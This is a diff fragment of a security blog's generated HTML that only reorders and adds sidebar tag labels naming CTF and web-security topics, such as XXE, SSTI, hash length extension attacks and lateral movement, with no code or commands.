-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
+    
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="md5"><span class="iconfont-archer">&#xe606;</span>md5</span>
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
@@ -3138,17 +3149,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
-    
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
         <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
     
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
+    
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
@@ -3160,19 +3171,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
+        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
+    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
-    
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
-        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="nginx常见文件位置"><span class="iconfont-archer">&#xe606;</span>nginx常见文件位置</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags=".htaccess利用"><span class="iconfont-archer">&#xe606;</span>.htaccess利用</span>
     
@@ -3184,13 +3195,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
         <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
         <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
     
@@ -3211,6 +3222,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
     
         <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
     
@@ -3256,7 +3269,7 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="HTTP协议"><span class="iconfont-archer">&#xe606;</span>HTTP协议</span>
     
-        <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
     
         <span class="sidebar-tag-name" data-tags="扫描软件"><span class="iconfont-archer">&#xe606;</span>扫描软件</span>
     
